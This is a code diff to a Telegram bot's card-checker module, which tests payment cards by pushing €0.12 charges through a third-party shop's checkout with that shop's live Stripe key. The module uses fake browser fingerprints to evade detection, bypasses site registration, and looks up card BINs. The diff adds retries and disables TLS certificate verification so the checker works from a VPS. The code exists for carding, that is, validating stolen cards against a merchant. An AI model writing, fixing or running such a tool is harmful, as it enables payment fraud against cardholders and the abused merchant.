@@ -2,6 +2,7 @@
 # Stripe Charge €0.12 - Compatible with WAYNE Bot Structure
 # UI format matches stauth.py with proper permissions
 # CORRECTED: Uses universal charge processor - credits deducted AFTER check completes
+# FIXED: VPS Compatibility - Improved session initialization and network handling
 
 import json
 import asyncio
@@ -14,6 +15,8 @@ from datetime import datetime
 from pyrogram import Client, filters
 from pyrogram.types import Message
 import html
+import ssl
+import certifi
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.start import load_users, save_users
 
@@ -160,6 +163,9 @@ class StripeCharge012Checker:
         self.last_bin_request = 0
         self.base_url = "https://bellobrick.com"
         self.stripe_key = "pk_live_51Gv2pCHrGjSxgNAlJ8eLnmjPrToBlChZFRgIpvGduYeqg66FzEJaQtLb4h2FOz193UH5RSoj6nUptqB5L7BRc9NR00VKfvfrsc"
+        
+        # VPS Compatibility: Added SSL context configuration
+        self.ssl_context = self.create_ssl_context()
 
         self.bin_services = [
             {
@@ -217,6 +223,28 @@ class StripeCharge012Checker:
 
         # Generate random browser fingerprints
         self.generate_browser_fingerprint()
+
+    def create_ssl_context(self):
+        """Create SSL context for VPS compatibility"""
+        try:
+            # Try to use system certificates first
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            return context
+        except:
+            # Fallback to certifi certificates
+            try:
+                context = ssl.create_default_context(cafile=certifi.where())
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                return context
+            except:
+                # Last resort: disable SSL verification (not recommended but works for VPS)
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                return context
 
     def generate_browser_fingerprint(self):
         """Generate realistic browser fingerprints to bypass detection"""
@@ -406,7 +434,11 @@ class StripeCharge012Checker:
             url = f"https://bins.antipublic.cc/bins/{bin_number}"
             headers = {'User-Agent': self.user_agent}
 
-            async with httpx.AsyncClient(timeout=10.0) as client:
+            async with httpx.AsyncClient(
+                timeout=10.0,
+                verify=self.ssl_context,
+                follow_redirects=True
+            ) as client:
                 response = await client.get(url, headers=headers)
 
                 if response.status_code == 200:
@@ -426,7 +458,11 @@ class StripeCharge012Checker:
                     url = service['url'].format(bin=bin_number)
                     headers = service['headers']
 
-                    async with httpx.AsyncClient(timeout=10.0) as client:
+                    async with httpx.AsyncClient(
+                        timeout=10.0,
+                        verify=self.ssl_context,
+                        follow_redirects=True
+                    ) as client:
                         response = await client.get(url, headers=headers)
 
                         if response.status_code == 200:
@@ -584,6 +620,9 @@ class StripeCharge012Checker:
         })
         kwargs['headers'] = headers
 
+        # VPS Compatibility: Set longer timeouts and retries
+        kwargs['timeout'] = kwargs.get('timeout', 30.0)
+
         try:
             response = await client.request(method, url, **kwargs)
 
@@ -602,20 +641,43 @@ class StripeCharge012Checker:
             raise e
 
     async def initialize_session(self, client):
-        """Initialize session with proper cookies"""
+        """Initialize session with proper cookies - IMPROVED FOR VPS"""
         try:
             logger.step(1, 8, "Initializing session...")
 
-            response = await self.make_stealth_request(
-                client, 'GET', f"{self.base_url}/"
-            )
+            # Try multiple approaches for VPS compatibility
+            for attempt in range(3):
+                try:
+                    # First try with SSL verification disabled
+                    response = await self.make_stealth_request(
+                        client, 'GET', f"{self.base_url}/"
+                    )
 
-            if response.status_code == 200:
-                logger.success("Session initialized successfully")
-                return True
-            else:
-                logger.error(f"Failed with status {response.status_code}")
-                return False
+                    if response.status_code == 200:
+                        logger.success("Session initialized successfully")
+                        return True
+                    else:
+                        logger.warning(f"Attempt {attempt + 1}: Status {response.status_code}")
+                        
+                        # Try alternative URL if main fails
+                        if attempt == 1:
+                            response = await self.make_stealth_request(
+                                client, 'GET', f"{self.base_url}/shop/"
+                            )
+                            if response.status_code == 200:
+                                logger.success("Session initialized via shop page")
+                                return True
+                        
+                        if attempt < 2:
+                            await asyncio.sleep(2)  # Wait before retry
+                            
+                except Exception as e:
+                    logger.warning(f"Session init attempt {attempt + 1} failed: {str(e)[:100]}")
+                    if attempt < 2:
+                        await asyncio.sleep(2)  # Wait before retry
+
+            logger.error(f"Failed to initialize session after 3 attempts")
+            return False
 
         except Exception as e:
             logger.error(f"Session initialization error: {str(e)}")
@@ -969,24 +1031,33 @@ class StripeCharge012Checker:
                 "Referer": "https://js.stripe.com/",
             }
 
-            response = await client.post("https://api.stripe.com/v1/payment_methods",
-                                         headers=stripe_headers, data=payment_data)
+            # VPS Compatibility: Use SSL context for Stripe API
+            stripe_client = httpx.AsyncClient(
+                timeout=30.0,
+                verify=self.ssl_context
+            )
+            
+            try:
+                response = await stripe_client.post("https://api.stripe.com/v1/payment_methods",
+                                             headers=stripe_headers, data=payment_data)
 
-            if response.status_code == 200:
-                result = response.json()
-                payment_method_id = result.get('id')
-                if payment_method_id:
-                    logger.success(f"Payment method created: {payment_method_id}")
-                    return {'success': True, 'payment_method_id': payment_method_id}
+                if response.status_code == 200:
+                    result = response.json()
+                    payment_method_id = result.get('id')
+                    if payment_method_id:
+                        logger.success(f"Payment method created: {payment_method_id}")
+                        return {'success': True, 'payment_method_id': payment_method_id}
+                    else:
+                        return {'success': False, 'error': 'No payment method ID'}
                 else:
-                    return {'success': False, 'error': 'No payment method ID'}
-            else:
-                try:
-                    error_data = response.json()
-                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
-                    return {'success': False, 'error': error_msg}
-                except:
-                    return {'success': False, 'error': 'Stripe API error'}
+                    try:
+                        error_data = response.json()
+                        error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
+                        return {'success': False, 'error': error_msg}
+                    except:
+                        return {'success': False, 'error': 'Stripe API error'}
+            finally:
+                await stripe_client.aclose()
 
         except Exception as e:
             return {'success': False, 'error': f"Payment method error: {str(e)}"}
@@ -1099,7 +1170,7 @@ class StripeCharge012Checker:
             }
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method"""
+        """Main card checking method - IMPROVED FOR VPS"""
         start_time = time.time()
         logger.info(f"🔍 Starting Stripe Charge €0.12 check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
 
@@ -1152,15 +1223,25 @@ class StripeCharge012Checker:
 
             logger.user(f"User: {first_name} {last_name} | {email} | {phone}")
 
+            # VPS Compatibility: Configure HTTP client with proper SSL and longer timeouts
             async with httpx.AsyncClient(
-                timeout=30.0,
+                timeout=45.0,  # Increased timeout for VPS
                 follow_redirects=True,
                 limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
-                http2=True
+                http2=True,
+                verify=self.ssl_context,  # Use custom SSL context
+                headers=self.get_base_headers()  # Add base headers
             ) as client:
 
-                if not await self.initialize_session(client):
-                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)
+                # Initialize session with retries
+                for attempt in range(2):
+                    if await self.initialize_session(client):
+                        break
+                    elif attempt == 0:
+                        logger.warning("First session init failed, retrying...")
+                        await asyncio.sleep(3)
+                    else:
+                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session (VPS Network Issue)", username, time.time()-start_time, user_data, bin_info)
 
                 bypass_success, error = await self.bypass_registration(client, user_info)
                 if not bypass_success:
@@ -1195,10 +1276,10 @@ class StripeCharge012Checker:
 
         except httpx.TimeoutException:
             logger.error("Request timeout")
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout (VPS)", username, time.time()-start_time, user_data, bin_info)
         except httpx.ConnectError:
             logger.error("Connection error")
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed (VPS Network)", username, time.time()-start_time, user_data, bin_info)
         except Exception as e:
             logger.error(f"Unexpected error: {str(e)}")
             return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
